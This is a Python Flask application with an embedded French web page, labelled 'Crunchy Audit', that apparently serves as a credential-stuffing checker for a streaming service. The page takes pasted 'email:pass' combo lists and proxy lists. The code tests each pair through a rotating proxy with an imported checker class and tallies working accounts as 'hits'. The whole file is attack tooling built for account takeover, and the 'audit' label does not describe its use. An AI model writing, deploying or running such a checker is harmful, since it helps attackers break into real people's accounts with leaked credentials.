import os
import uuid
import random
import threading
from flask import Flask, render_template_string, request, jsonify
from chk import CrunchyChecker

app = Flask(__name__)
scans = {}

# Interface HTML intégrée
UI = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Crunchy Checker Railway</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white p-6">
    <div class="max-w-xl mx-auto bg-zinc-900 p-6 rounded-2xl border border-zinc-800">
        <h1 class="text-2xl font-black text-orange-500 mb-4 italic">CRUNCHY AUDIT</h1>
        <textarea id="c" class="w-full h-32 bg-black border border-zinc-800 rounded-lg p-3 text-sm font-mono mb-3" placeholder="email:pass"></textarea>
        <textarea id="p" class="w-full h-20 bg-black border border-zinc-800 rounded-lg p-3 text-sm font-mono mb-3" placeholder="ip:port"></textarea>
        <button onclick="run()" id="b" class="w-full bg-orange-600 py-3 rounded-lg font-bold">LANCER</button>
        
        <div class="grid grid-cols-4 gap-2 mt-6">
            <div class="bg-black p-2 rounded border border-zinc-800 text-center text-xs">Hits: <span id="h" class="text-green-500 block text-lg font-bold">0</span></div>
            <div class="bg-black p-2 rounded border border-zinc-800 text-center text-xs">Bad: <span id="bad" class="text-red-500 block text-lg font-bold">0</span></div>
            <div class="bg-black p-2 rounded border border-zinc-800 text-center text-xs">Check: <span id="chk" class="text-blue-500 block text-lg font-bold">0</span></div>
            <div class="bg-black p-2 rounded border border-zinc-800 text-center text-xs">Retry: <span id="r" class="text-orange-400 block text-lg font-bold">0</span></div>
        </div>
        <div id="logs" class="mt-4 h-32 overflow-y-auto bg-black p-3 rounded font-mono text-[10px] text-zinc-500"></div>
    </div>
    <script>
        let sid = null;
        async function run() {
            const combos = document.getElementById('c').value.split('\\n').filter(x => x.includes(':'));
            if(!combos.length) return alert('No combos');
            document.getElementById('b').disabled = true;
            const r = await fetch('/api/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({c: combos, p: document.getElementById('p').value.split('\\n').filter(x => x.length > 5)})
            });
            const d = await r.json();
            sid = d.sid;
            setInterval(update, 1000);
        }
        async function update() {
            if(!sid) return;
            const r = await fetch('/api/status/' + sid);
            const d = await r.json();
            document.getElementById('h').innerText = d.h;
            document.getElementById('bad').innerText = d.b;
            document.getElementById('chk').innerText = d.c;
            document.getElementById('r').innerText = d.r;
            document.getElementById('logs').innerHTML = d.l.slice(-10).map(x => `<div>${x}</div>`).join('');
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(UI)

@app.route('/api/start', methods=['POST'])
def start():
    data = request.json
    sid = str(uuid.uuid4())
    scans[sid] = {'h':0, 'b':0, 'c':0, 'r':0, 'l':[]}
    
    def work(sid, combos, proxies):
        for line in combos:
            u, p = line.strip().split(':', 1)
            proxy = random.choice(proxies) if proxies else None
            checker = CrunchyChecker(proxy)
            res = checker.get_token(u, p)
            if res == "SUCCESS":
                scans[sid]['h'] += 1
                scans[sid]['l'].append(f"HIT: {u}")
            elif res == "INVALID":
                scans[sid]['b'] += 1
                scans[sid]['l'].append(f"BAD: {u}")
            else:
                scans[sid]['r'] += 1
            scans[sid]['c'] += 1
            
    threading.Thread(target=work, args=(sid, data['c'], data['p']), daemon=True).start()
    return jsonify({"sid": sid})

@app.route('/api/status/<sid>')
def status(sid):
    return jsonify(scans.get(sid, {}))

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
